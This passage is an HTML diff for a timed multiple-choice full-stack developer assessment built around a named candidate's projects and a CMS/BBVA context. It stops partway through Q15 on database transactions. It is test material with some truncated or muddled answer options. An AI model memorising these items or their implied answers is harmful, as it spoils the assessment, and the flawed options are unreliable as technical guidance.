@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Full-Stack Developer — Aayushi Vyas · CMS + BBVA</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&display=swap');
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg:#070B14;--bg2:#0C1220;--bg3:#101829;--border:#182236;--border2:#1F2E47;
+      --blue:#3B82F6;--blue2:#2563EB;--blu-lt:rgba(59,130,246,.1);--blu-xlt:rgba(59,130,246,.05);
+      --emerald:#10B981;--em-lt:rgba(16,185,129,.1);
+      --sky:#38BDF8;--sky-lt:rgba(56,189,248,.1);
+      --amber:#F59E0B;--amb-lt:rgba(245,158,11,.1);
+      --red:#EF4444;--red-lt:rgba(239,68,68,.1);
+      --green:#22C55E;--grn-lt:rgba(34,197,94,.1);
+      --text:#E2EBF8;--muted:#233050;--sub:#5C7099;
+      --mono:'Fira Code',monospace;--sans:'Inter',sans-serif;
+    }
+    html{scroll-behavior:smooth}
+    body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;overflow-x:hidden}
+    body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 35% at 50% -5%,rgba(59,130,246,.09) 0%,transparent 65%);pointer-events:none;z-index:0}
+    .hdr{position:sticky;top:0;z-index:200;background:rgba(7,11,20,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);height:54px;display:flex;align-items:center;justify-content:space-between;padding:0 40px}
+    .hdr-l{display:flex;align-items:center;gap:14px}
+    .logo{font-family:var(--mono);font-size:11px;font-weight:600;color:#fff;background:var(--blue2);padding:3px 10px;border-radius:4px;letter-spacing:.06em}
+    .hdr-title{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.04em}
+    .hdr-r{display:flex;align-items:center;gap:12px}
+    .jd-tag{font-family:var(--mono);font-size:10px;font-weight:600;color:var(--emerald);border:1px solid rgba(16,185,129,.35);background:var(--em-lt);padding:3px 9px;border-radius:3px;letter-spacing:.06em}
+    .tmr{font-family:var(--mono);font-size:19px;font-weight:600;color:var(--amber);min-width:52px;text-align:right}
+    .tmr.urgent{color:var(--red);animation:fl .75s ease-in-out infinite}
+    @keyframes fl{0%,100%{opacity:1}50%{opacity:.4}}
+    .prog{height:2px;background:var(--border);z-index:1}
+    .prog-f{height:100%;background:linear-gradient(90deg,var(--blue2),var(--emerald));transition:width .4s cubic-bezier(.4,0,.2,1)}
+    .main{max-width:840px;margin:0 auto;padding:36px 20px 100px;position:relative;z-index:1}
+    .hero{border:1px solid var(--border2);border-radius:14px;padding:34px 40px;margin-bottom:36px;background:linear-gradient(135deg,var(--bg2) 0%,var(--bg3) 100%);position:relative;overflow:hidden}
+    .hero::after{content:'';position:absolute;top:-60px;right:-60px;width:210px;height:210px;border-radius:50%;background:radial-gradient(circle,rgba(59,130,246,.09) 0%,transparent 70%);pointer-events:none}
+    .hero-eye{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.16em;text-transform:uppercase;color:var(--blue);margin-bottom:10px}
+    .hero h1{font-size:24px;font-weight:700;line-height:1.2;margin-bottom:10px}
+    .hero h1 em{color:var(--blue);font-style:normal}
+    .hero p{font-size:14px;color:var(--sub);line-height:1.7;margin-bottom:22px;max-width:560px}
+    .hero-tags{display:flex;gap:8px;flex-wrap:wrap}
+    .htag{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.05em;padding:4px 11px;border-radius:20px;border:1px solid}
+    .ht-b{color:var(--blue);border-color:rgba(59,130,246,.35);background:var(--blu-lt)}
+    .ht-e{color:var(--emerald);border-color:rgba(16,185,129,.35);background:var(--em-lt)}
+    .ht-s{color:var(--sky);border-color:rgba(56,189,248,.35);background:var(--sky-lt)}
+    .ht-a{color:var(--amber);border-color:rgba(245,158,11,.35);background:var(--amb-lt)}
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:36px}
+    .stat{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:14px;text-align:center}
+    .stat .sv{font-family:var(--mono);font-size:22px;font-weight:600;color:var(--blue)}
+    .stat .sl{font-size:11px;color:var(--muted);margin-top:3px;text-transform:uppercase;letter-spacing:.07em;font-family:var(--mono)}
+    .sec{display:flex;align-items:center;gap:12px;margin:42px 0 16px}
+    .sec-pill{font-family:var(--mono);font-size:9px;font-weight:600;letter-spacing:.14em;text-transform:uppercase;color:var(--blue);background:var(--blu-lt);border:1px solid rgba(59,130,246,.3);padding:3px 11px;border-radius:20px;white-space:nowrap}
+    .sec-line{flex:1;height:1px;background:var(--border)}
+    .sec-cnt{font-family:var(--mono);font-size:10px;color:var(--muted);white-space:nowrap}
+    .qcard{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px 22px;margin-bottom:12px;position:relative;transition:border-color .2s}
+    .qcard::before{content:'';position:absolute;left:0;top:14px;bottom:14px;width:3px;border-radius:0 2px 2px 0;background:var(--border2);transition:background .3s}
+    .qcard.answered{border-color:rgba(34,197,94,.25)} .qcard.answered::before{background:var(--green)}
+    .qcard.incorrect{border-color:rgba(239,68,68,.2)} .qcard.incorrect::before{background:var(--red)}
+    .qmeta{display:flex;align-items:center;gap:10px;margin-bottom:12px;flex-wrap:wrap}
+    .qnum{font-family:var(--mono);font-size:11px;font-weight:600;color:#fff;background:var(--blue2);padding:2px 8px;border-radius:3px;min-width:34px;text-align:center}
+    .qtag{font-family:var(--mono);font-size:10px;font-weight:600;letter-spacing:.07em;color:var(--muted);text-transform:uppercase}
+    .qdiff{margin-left:auto;font-family:var(--mono);font-size:9px;font-weight:600;letter-spacing:.1em;padding:2px 9px;border-radius:20px;text-transform:uppercase}
+    .dm{color:var(--amber);background:var(--amb-lt);border:1px solid rgba(245,158,11,.3)}
+    .dh{color:var(--red);background:var(--red-lt);border:1px solid rgba(239,68,68,.3)}
+    .qtext{font-size:15px;font-weight:600;color:var(--text);line-height:1.58;margin-bottom:18px}
+    .qtext code{font-family:var(--mono);font-size:12.5px;background:var(--blu-lt);color:var(--blue);padding:1px 6px;border-radius:3px}
+    .opts{display:flex;flex-direction:column;gap:8px}
+    .opt{display:flex;align-items:flex-start;gap:11px;padding:11px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;cursor:pointer;font-size:14px;line-height:1.55;color:var(--sub);transition:all .15s;user-select:none}
+    .opt:hover:not(.locked){border-color:var(--blue2);background:var(--blu-xlt);color:var(--text)}
+    .ok{font-family:var(--mono);font-size:11px;font-weight:600;min-width:22px;height:22px;border-radius:3px;background:var(--border2);color:var(--muted);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;transition:all .15s}
+    .opt.correct-pick{border-color:var(--green);background:var(--grn-lt);color:var(--text)} .opt.correct-pick .ok{background:#16A34A;color:#fff}
+    .opt.wrong-pick{border-color:var(--red);background:var(--red-lt);color:var(--text)} .opt.wrong-pick .ok{background:#DC2626;color:#fff}
+    .opt.reveal-right{border-color:var(--green);background:var(--grn-lt);color:var(--text)} .opt.reveal-right .ok{background:#16A34A;color:#fff}
+    .expl{display:none;margin-top:12px;padding:13px 16px;border-radius:8px;font-size:13px;line-height:1.75}
+    .expl.show{display:block}
+    .expl-ok{background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.2);color:#86EFAC}
+    .expl-bad{background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.2);color:#FCA5A5}
+    .fbar{position:fixed;bottom:0;left:0;right:0;z-index:200;background:rgba(7,11,20,.97);backdrop-filter:blur(14px);border-top:1px solid var(--border);padding:12px 40px;display:flex;align-items:center;justify-content:space-between}
+    .fstats{display:flex;gap:20px;font-family:var(--mono);font-size:12px;color:var(--muted)}
+    .fstats span{color:var(--blue);font-weight:600} .fstats .ft{color:var(--amber)}
+    .btn-sub{font-family:var(--mono);font-size:11px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:11px 28px;background:var(--blue2);color:#fff;border:none;border-radius:5px;cursor:pointer;transition:background .2s,transform .1s}
+    .btn-sub:hover{background:var(--blue);transform:translateY(-1px)}
+    .results{display:none;background:var(--bg2);border:1px solid var(--border2);border-radius:14px;padding:36px;margin-top:40px}
+    .results.show{display:block}
+    .rtitle{font-size:22px;font-weight:700;margin-bottom:4px} .rtitle span{color:var(--blue)}
+    .rsub{font-family:var(--mono);font-size:12px;color:var(--muted);margin-bottom:28px}
+    .sgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:26px}
+    .sbox{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:16px;text-align:center}
+    .sbox .sv{font-family:var(--mono);font-size:26px;font-weight:600}
+    .sbox.bc .sv{color:var(--blue)} .sbox.gc .sv{color:var(--green)}
+    .sbox.ac .sv{color:var(--amber)} .sbox.rc .sv{color:var(--red)}
+    .sbox .sl{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.08em;font-family:var(--mono)}
+    .verdict{padding:15px 18px;border-radius:9px;font-size:15px;font-weight:600;margin-bottom:24px;border:1px solid}
+    .v-ex{background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.3);color:#93C5FD}
+    .v-good{background:rgba(34,197,94,.07);border-color:rgba(34,197,94,.25);color:var(--green)}
+    .v-ok{background:rgba(245,158,11,.07);border-color:rgba(245,158,11,.3);color:var(--amber)}
+    .v-try{background:rgba(239,68,68,.07);border-color:rgba(239,68,68,.3);color:var(--red)}
+    .sb-head{font-family:var(--mono);font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+    .sb-row{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+    .sb-name{width:240px;flex-shrink:0;font-size:12px;color:var(--sub);font-family:var(--mono)}
+    .sb-track{flex:1;background:var(--border);border-radius:2px;height:6px}
+    .sb-fill{height:100%;border-radius:2px;background:var(--blue);transition:width .7s cubic-bezier(.4,0,.2,1)}
+    .sb-num{font-family:var(--mono);font-size:11px;color:var(--muted);width:36px;text-align:right}
+    @media(max-width:600px){.hdr{padding:0 14px}.hero{padding:22px 18px}.main{padding:20px 12px 100px}.stats,.sgrid{grid-template-columns:repeat(2,1fr)}.fbar{padding:10px 14px}.fstats{gap:10px;font-size:11px}.jd-tag{display:none}}
+  </style>
+</head>
+<body>
+<header class="hdr">
+  <div class="hdr-l">
+    <span class="logo">MERN//EVAL</span>
+    <span class="hdr-title">FULL-STACK DEVELOPER · AAYUSHI VYAS · CMS + BBVA</span>
+  </div>
+  <div class="hdr-r">
+    <span class="jd-tag">JD: CMS · BBVA · MEDIUM-HARD</span>
+    <div class="tmr" id="tmrDisp">35:00</div>
+  </div>
+</header>
+<div class="prog"><div class="prog-f" id="progF" style="width:0%"></div></div>
+
+<main class="main">
+  <div class="hero">
+    <div class="hero-eye">Full-Stack Developer Assessment · CMS + BBVA Financial Context</div>
+    <h1>25 Questions · <em>Medium &amp; Hard</em> · Node.js + React Full-Stack</h1>
+    <p>Anchored to Aayushi's 4-year production experience — React performance and component architecture from Bobcat DXP and Let's Meet, Node.js/Express API design and async patterns from Synapse, PostgreSQL optimisation and transactions, AWS Lambda constraints, Docker, and CMS/BBVA-specific patterns including role-based publishing, content versioning, XSS prevention, and multi-service event architecture.</p>
+    <div class="hero-tags">
+      <span class="htag ht-b">React.js · TypeScript · Next.js</span>
+      <span class="htag ht-e">Node.js · Express · REST APIs</span>
+      <span class="htag ht-s">PostgreSQL · MongoDB · Redis</span>
+      <span class="htag ht-a">AWS Lambda · Docker · Nginx</span>
+      <span class="htag ht-b">CMS · BBVA · Security · JWT</span>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="sv">25</div><div class="sl">Questions</div></div>
+    <div class="stat"><div class="sv">35</div><div class="sl">Minutes</div></div>
+    <div class="stat"><div class="sv">M+H</div><div class="sl">Difficulty</div></div>
+    <div class="stat"><div class="sv">5</div><div class="sl">Sections</div></div>
+  </div>
+
+  <div class="sec"><span class="sec-pill">React.js · TypeScript · Frontend</span><div class="sec-line"></div><span class="sec-cnt">Q1–Q6</span></div>
+  <div class="qcard" id="qc-1">
+    <div class="qmeta"><span class="qnum">Q01</span><span class="qtag">React Performance</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Bobcat DXP project you built reusable React components across multiple portals. A product list component re-renders every time any unrelated state changes in the parent. Which hook specifically prevents a child component from re-rendering when its props have not changed?</div>
+    <div class="opts" id="o-1">
+      <div class="opt" onclick="pick(1,'A')"><span class="ok">A</span>React.memo — it wraps the component and performs a shallow prop comparison before each render; if props are unchanged by reference, the component skips the render entirely</div>
+      <div class="opt" onclick="pick(1,'B')"><span class="ok">B</span>useRef — it stores a mutable value that persists across renders without causing re-renders, making it suitable for skipping child renders when the ref value has not changed</div>
+      <div class="opt" onclick="pick(1,'C')"><span class="ok">C</span>useMemo — it memoises the computed return value of a function so expensive calculations do not repeat; it does not prevent a component from re-rendering</div>
+      <div class="opt" onclick="pick(1,'D')"><span class="ok">D</span>useCallback — it memoises a function reference so the child receives the same function reference between renders, preventing the re-render caused by a new function prop</div>
+    </div>
+    <div class="expl" id="ex-1"></div>
+  </div>
+
+  <div class="qcard" id="qc-2">
+    <div class="qmeta"><span class="qnum">Q02</span><span class="qtag">React State Management</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Synapse task workflow platform you integrated React frontend with backend APIs for real-time task tracking. When the same task data is needed by multiple sibling components at different levels of the component tree, what is the React-idiomatic solution without adding Redux?</div>
+    <div class="opts" id="o-2">
+      <div class="opt" onclick="pick(2,'A')"><span class="ok">A</span>Use useRef to create a shared mutable reference at the top level — refs persist across renders and can be passed to any component that needs to read or write the shared value</div>
+      <div class="opt" onclick="pick(2,'B')"><span class="ok">B</span>Use useEffect with an event listener on window — dispatch a custom event from one component and listen for it in the sibling to synchronise state without lifting it to a common ancestor</div>
+      <div class="opt" onclick="pick(2,'C')"><span class="ok">C</span>Pass data down through all intermediate components as props (prop drilling) — this is the correct React pattern for sharing data between components regardless of nesting depth</div>
+      <div class="opt" onclick="pick(2,'D')"><span class="ok">D</span>Lift the shared state to the nearest common ancestor component and pass it down as props to the siblings that need it — if the ancestor is far up the tree, wrap with a React Context provider to avoid prop drilling through many intermediate layers</div>
+    </div>
+    <div class="expl" id="ex-2"></div>
+  </div>
+
+  <div class="qcard" id="qc-3">
+    <div class="qmeta"><span class="qnum">Q03</span><span class="qtag">TypeScript Generics</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Bobcat and Synapse projects you used TypeScript. You have an API utility function that fetches data from different endpoints and should return typed responses — sometimes a User[], sometimes a Task[], sometimes a Product[]. How do you type this function without writing separate functions for each return type?</div>
+    <div class="opts" id="o-3">
+      <div class="opt" onclick="pick(3,'A')"><span class="ok">A</span>Use function overloads: declare the function three times with different signatures and implement it once — overloads are the TypeScript-idiomatic way to return different types based on input</div>
+      <div class="opt" onclick="pick(3,'B')"><span class="ok">B</span>Use a generic type parameter: async function fetchData<T>(url: string): Promise<T> — the caller specifies the type at call site: fetchData<User[]>('/api/users'). This gives full type safety without duplicate function definitions</div>
+      <div class="opt" onclick="pick(3,'C')"><span class="ok">C</span>Use a union return type: Promise<User[] | Task[] | Product[]> — TypeScript narrows the type automatically based on the url string passed to the function</div>
+      <div class="opt" onclick="pick(3,'D')"><span class="ok">D</span>Use any as the return type — TypeScript will infer the correct type at call sites based on how the return value is used</div>
+    </div>
+    <div class="expl" id="ex-3"></div>
+  </div>
+
+  <div class="qcard" id="qc-4">
+    <div class="qmeta"><span class="qnum">Q04</span><span class="qtag">Next.js SSG vs SSR</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">The BBVA CMS project uses Next.js. A financial product page is updated by editors daily and must always show current rates. A marketing landing page is updated monthly and has very high traffic. What data fetching strategy fits each?</div>
+    <div class="opts" id="o-4">
+      <div class="opt" onclick="pick(4,'A')"><span class="ok">A</span>Financial product page: getStaticProps with revalidate:60 — ISR refreshes every 60 seconds which is sufficient. Marketing landing page: getStaticProps with no revalidate — monthly updates mean static build-time generation is fine</div>
+      <div class="opt" onclick="pick(4,'B')"><span class="ok">B</span>Financial product page: getServerSideProps (SSR) — data fetches fresh on every request, always current. Marketing landing page: getStaticProps with revalidate (ISR) — statically generated and cached, fast for high traffic, revalidates in background every N seconds without a full redeploy</div>
+      <div class="opt" onclick="pick(4,'C')"><span class="ok">C</span>Financial product page: client-side fetching with useEffect — fetch rates from the API in the browser on every page load. Marketing landing page: getStaticProps — the page is built at deploy time</div>
+      <div class="opt" onclick="pick(4,'D')"><span class="ok">D</span>Both should use getServerSideProps — financial applications require server-side rendering on every request to guarantee data freshness, regardless of update frequency</div>
+    </div>
+    <div class="expl" id="ex-4"></div>
+  </div>
+
+  <div class="qcard" id="qc-5">
+    <div class="qmeta"><span class="qnum">Q05</span><span class="qtag">React Forms</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">For the BBVA CMS, content editors submit financial product forms with 15+ fields including required validations and async server-side checks. What is the recommended React form management approach for this complexity?</div>
+    <div class="opts" id="o-5">
+      <div class="opt" onclick="pick(5,'A')"><span class="ok">A</span>Use a single useState object for all 15 fields with a generic handleChange updater — this reduces state declarations while still providing controlled inputs with centralized state</div>
+      <div class="opt" onclick="pick(5,'B')"><span class="ok">B</span>Use uncontrolled inputs with refs for all fields — read all values on submit via ref.current.value, validate them in the submit handler, and display error messages as DOM mutations</div>
+      <div class="opt" onclick="pick(5,'C')"><span class="ok">C</span>Use a form library like React Hook Form — it manages field registration, validation rules (required, pattern, min/max), async validation (validate: async (v) => await serverCheck(v)).</div>
+      <div class="opt" onclick="pick(5,'D')"><span class="ok">D</span>Manage all 15 fields with individual useState calls and write custom validation logic inline in the onChange handlers — this gives full control over every field's behaviour</div>
+    </div>
+    <div class="expl" id="ex-5"></div>
+  </div>
+
+  <div class="qcard" id="qc-6">
+    <div class="qmeta"><span class="qnum">Q06</span><span class="qtag">Component Architecture</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Bobcat DXP you built reusable React components across multiple portal applications. A BBVA CMS requires UI components (cards, tables, modals) that must be consistent across 5 different micro-frontends maintained by different teams. What architectural pattern ensures consistency without code duplication?</div>
+    <div class="opts" id="o-6">
+      <div class="opt" onclick="pick(6,'A')"><span class="ok">A</span>Copy the component code into each micro-frontend — this gives each team full ownership and avoids version conflicts between shared dependencies</div>
+      <div class="opt" onclick="pick(6,'B')"><span class="ok">B</span>Use CSS custom properties (variables) shared in a global stylesheet — consistent styling through shared CSS achieves visual consistency without a shared component package</div>
+      <div class="opt" onclick="pick(6,'C')"><span class="ok">C</span>Have one team own all components and the other teams submit PRs to that repository — centralised ownership prevents inconsistency even if it slows individual team velocity</div>
+      <div class="opt" onclick="pick(6,'D')"><span class="ok">D</span>Build a shared component library (a separate npm package or monorepo package) published internally — each micro-frontend imports from the shared package. Version pinning ensures teams can upgrade at their own pace while the library maintains design consistency</div>
+    </div>
+    <div class="expl" id="ex-6"></div>
+  </div>
+
+  <div class="sec"><span class="sec-pill">Node.js · Express · APIs</span><div class="sec-line"></div><span class="sec-cnt">Q7–Q11</span></div>
+  <div class="qcard" id="qc-7">
+    <div class="qmeta"><span class="qnum">Q07</span><span class="qtag">Node.js Event Loop</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">Your Express.js API endpoint calls a synchronous bcrypt.hashSync() to hash a user password before saving to PostgreSQL. Under load, 50 concurrent requests hit this endpoint and responses slow to 30 seconds. What is the root cause and fix?</div>
+    <div class="opts" id="o-7">
+      <div class="opt" onclick="pick(7,'A')"><span class="ok">A</span>Node.js is single-threaded and cannot handle 50 concurrent requests regardless of implementation — the fix is to run multiple Node.js processes using a load balancer</div>
+      <div class="opt" onclick="pick(7,'B')"><span class="ok">B</span>bcrypt.hashSync() is CPU-bound and blocks the Node.js event loop — while hashing, Node cannot process any other requests. Fix: use bcrypt.hash() (the async version with callback/promise) which offloads work to libuv's th.</div>
+      <div class="opt" onclick="pick(7,'C')"><span class="ok">C</span>The issue is the PostgreSQL INSERT blocking the event loop — replace synchronous pg queries with the async pg Pool client; the bcrypt operation is not the bottleneck</div>
+      <div class="opt" onclick="pick(7,'D')"><span class="ok">D</span>bcrypt.hashSync() is slow because it has no database connection pooling — replace it with a connection pool to make the hash operation faster</div>
+    </div>
+    <div class="expl" id="ex-7"></div>
+  </div>
+
+  <div class="qcard" id="qc-8">
+    <div class="qmeta"><span class="qnum">Q08</span><span class="qtag">REST API Design</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Synapse platform you designed REST APIs for task management with notification and escalation. A BBVA CMS API needs an endpoint where an editor can publish multiple articles in one action. What is the most REST-appropriate design?</div>
+    <div class="opts" id="o-8">
+      <div class="opt" onclick="pick(8,'A')"><span class="ok">A</span>GET /articles/publish?ids=1,2,3 — GET requests with query parameters are idempotent and safe, making them the correct choice for state-changing operations that should be repeatable</div>
+      <div class="opt" onclick="pick(8,'B')"><span class="ok">B</span>PATCH /articles/1, PATCH /articles/2, PATCH /articles/3 — individual PATCH calls per article ensure atomicity; batch operations violate REST's resource-per-URL principle</div>
+      <div class="opt" onclick="pick(8,'C')"><span class="ok">C</span>POST /publish with a body containing an array of article IDs — REST allows batch operations via POST to a resource action endpoint; semantically, publishing is a state transition, not a CRUD create</div>
+      <div class="opt" onclick="pick(8,'D')"><span class="ok">D</span>PUT /articles with a body of all articles including their new published:true status — PUT replaces the entire resource collection, making batch state updates semantically correct</div>
+    </div>
+    <div class="expl" id="ex-8"></div>
+  </div>
+
+  <div class="qcard" id="qc-9">
+    <div class="qmeta"><span class="qnum">Q09</span><span class="qtag">Express Middleware</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">For the BBVA CMS API you need to: authenticate every request, log all requests with response time, and validate request bodies against a JSON schema. In what order should these middleware be registered in Express and why?</div>
+    <div class="opts" id="o-9">
+      <div class="opt" onclick="pick(9,'A')"><span class="ok">A</span>Authentication → logging → JSON schema validation — authenticate first to reject unauthorised requests before spending resources on logging</div>
+      <div class="opt" onclick="pick(9,'B')"><span class="ok">B</span>JSON schema validation → authentication → logging — validate inputs first to reject malformed requests before any authentication overhead</div>
+      <div class="opt" onclick="pick(9,'C')"><span class="ok">C</span>Logging → authentication → JSON schema validation — log every request first (even failed ones) for audit trail completeness, then authenticate to reject unauthorised requests early, then validate schema on requests that passed auth</div>
+      <div class="opt" onclick="pick(9,'D')"><span class="ok">D</span>All three orders are equivalent — Express evaluates all registered middleware and picks the most efficient execution order at runtime</div>
+    </div>
+    <div class="expl" id="ex-9"></div>
+  </div>
+
+  <div class="qcard" id="qc-10">
+    <div class="qmeta"><span class="qnum">Q10</span><span class="qtag">JWT & Session Management</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">In your Synapse platform you implemented role-based access control. For the BBVA CMS with Editor, Reviewer, and Admin roles, what is the correct JWT implementation to prevent a user whose role is downgraded from continuing to use their old token?</div>
+    <div class="opts" id="o-10">
+      <div class="opt" onclick="pick(10,'A')"><span class="ok">A</span>Include a role_version field in the JWT; increment the version in the database when a role changes; reject JWTs whose role_version doesn't match the current database value</div>
+      <div class="opt" onclick="pick(10,'B')"><span class="ok">B</span>Store the user's current role in a database table; on every request, query the database to check the live role rather than trusting the role claim in the JWT — the JWT only provides user identity, not authorisation</div>
+      <div class="opt" onclick="pick(10,'C')"><span class="ok">C</span>Both A and B are valid production patterns with different trade-offs: A gives immediate revocation at the cost of one DB lookup per request; B gives eventual consistency (up to 15min) with no DB lookup per request — the correct choice depends on BBVA's compliance requirements</div>
+      <div class="opt" onclick="pick(10,'D')"><span class="ok">D</span>Set a very short JWT expiry (15 minutes) with refresh tokens — downgraded roles take effect within 15 minutes when the short-lived access token expires; the refresh endpoint checks the current role before issuing a new token</div>
+    </div>
+    <div class="expl" id="ex-10"></div>
+  </div>
+
+  <div class="qcard" id="qc-11">
+    <div class="qmeta"><span class="qnum">Q11</span><span class="qtag">Node.js Async Patterns</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your AWS Lambda functions for Bobcat DXP, you call three independent APIs: fetchProductData(), fetchDealerInfo(), and fetchPricingData(). Each takes ~1 second. Written with sequential awaits, total time is ~3 seconds. What is the correct fix?</div>
+    <div class="opts" id="o-11">
+      <div class="opt" onclick="pick(11,'A')"><span class="ok">A</span>Use async/await in a for...of loop — looping over an array of fetch functions with await in a for...of correctly parallelises the calls</div>
+      <div class="opt" onclick="pick(11,'B')"><span class="ok">B</span>Use Promise.all([fetchProductData(), fetchDealerInfo(), fetchPricingData()]) — this initiates all three Promises concurrently and awaits all three completions simultaneously; total time becomes ~1 second (the slowest call) instead of ~3 seconds</div>
+      <div class="opt" onclick="pick(11,'C')"><span class="ok">C</span>Use setTimeout with 0ms delay between each call — this defers each API call to the next event loop tick, allowing them to interleave</div>
+      <div class="opt" onclick="pick(11,'D')"><span class="ok">D</span>Move two of the three calls to separate Lambda functions and invoke them in parallel — Node.js cannot run concurrent network calls within one Lambda execution</div>
+    </div>
+    <div class="expl" id="ex-11"></div>
+  </div>
+
+  <div class="sec"><span class="sec-pill">PostgreSQL · MongoDB · Redis</span><div class="sec-line"></div><span class="sec-cnt">Q12–Q15</span></div>
+  <div class="qcard" id="qc-12">
+    <div class="qmeta"><span class="qnum">Q12</span><span class="qtag">PostgreSQL Query Optimization</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">In your Synapse platform you optimized PostgreSQL schemas and stored procedures. A BBVA CMS query filtering articles by status='published' AND created_at > '2024-01-01' AND author_id = 42 on a 2M-row table takes 8 seconds. What indexing strategy helps most?</div>
+    <div class="opts" id="o-12">
+      <div class="opt" onclick="pick(12,'A')"><span class="ok">A</span>Create a compound index on (author_id, status, created_at) — equality filters (author_id, status) first, range filter (created_at) last. PostgreSQL uses the leftmost prefix for equality matches and pushes the range filter to the end, covering all three conditions in one index scan</div>
+      <div class="opt" onclick="pick(12,'B')"><span class="ok">B</span>Add a B-tree index on status alone — the query planner will use this index for the status filter and apply the other conditions as post-filter on the matched rows</div>
+      <div class="opt" onclick="pick(12,'C')"><span class="ok">C</span>Partition the table by created_at into monthly partitions — partitioning eliminates the full-table scan by pruning irrelevant partitions, replacing the need for any additional indexes</div>
+      <div class="opt" onclick="pick(12,'D')"><span class="ok">D</span>Add a full-text index on the status column — full-text indexes are optimised for equality lookups on string columns and will accelerate the status filter</div>
+    </div>
+    <div class="expl" id="ex-12"></div>
+  </div>
+
+  <div class="qcard" id="qc-13">
+    <div class="qmeta"><span class="qnum">Q13</span><span class="qtag">MongoDB vs PostgreSQL</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">You have used both MongoDB and PostgreSQL. For the BBVA CMS storing financial product pages where each page has a fixed schema (title, rate, terms, category) but content editors occasionally add custom fields that vary per product type, which database and schema strategy fits best?</div>
+    <div class="opts" id="o-13">
+      <div class="opt" onclick="pick(13,'A')"><span class="ok">A</span>Two databases: PostgreSQL for fixed fields and MongoDB for custom fields, joined at the application layer using the product ID as the key — this gives both databases the workload they are optimised for</div>
+      <div class="opt" onclick="pick(13,'B')"><span class="ok">B</span>PostgreSQL with a JSONB column for custom fields — the fixed fields (title, rate, terms, category) are typed columns with constraints and indexes; custom fields live in a JSONB column that is schema-flexible, queryable, and indexable.</div>
+      <div class="opt" onclick="pick(13,'C')"><span class="ok">C</span>PostgreSQL with EAV (Entity-Attribute-Value) pattern — store all custom fields in a separate attribute table with rows per field; this is the standard PostgreSQL pattern for variable schema in relational databases</div>
+      <div class="opt" onclick="pick(13,'D')"><span class="ok">D</span>MongoDB — its schema-less design handles custom fields natively without migrations; each document can have any additional fields an editor adds without affecting other products</div>
+    </div>
+    <div class="expl" id="ex-13"></div>
+  </div>
+
+  <div class="qcard" id="qc-14">
+    <div class="qmeta"><span class="qnum">Q14</span><span class="qtag">Redis Usage Patterns</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Bobcat DXP project using AWS Lambda, you need to cache API responses for 5 minutes to reduce downstream API calls. Redis is available. Which Redis pattern and command correctly implements read-through caching with expiry?</div>
+    <div class="opts" id="o-14">
+      <div class="opt" onclick="pick(14,'A')"><span class="ok">A</span>Use Redis SETEX with a fixed key per endpoint — SETEX sets a value and expiry atomically, but each Lambda cold start must call SETEX regardless of whether a value exists, causing unnecessary cache overwrites on every invocation</div>
+      <div class="opt" onclick="pick(14,'B')"><span class="ok">B</span>Use Redis RPUSH to append each API response to a list and LRANGE to retrieve the last response — lists preserve order and allow you to keep a history of responses</div>
+      <div class="opt" onclick="pick(14,'C')"><span class="ok">C</span>Use Redis HSET to store responses as hash fields keyed by endpoint path — hashes group related cache entries and are more memory-efficient than separate string keys for multiple endpoints</div>
+      <div class="opt" onclick="pick(14,'D')"><span class="ok">D</span>Use Redis GET to check for a cached value; if missing (cache miss), fetch from the API, then SET the response with EX 300 (5-minute TTL). On subsequent requests, GET returns the cached value until TTL expires — this is the cache-aside (lazy loading) pattern</div>
+    </div>
+    <div class="expl" id="ex-14"></div>
+  </div>
+
+  <div class="qcard" id="qc-15">
+    <div class="qmeta"><span class="qnum">Q15</span><span class="qtag">Database Transactions</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">In the BBVA CMS, publishing an article requires: (1) update article status to published, (2) create an audit log entry, (3) increment the author's published_count. If the server crashes between steps, data is inconsistent. How do you implement this atomically in PostgreSQL with Node.js?</div>
+    <div class="opts" id="o-15">
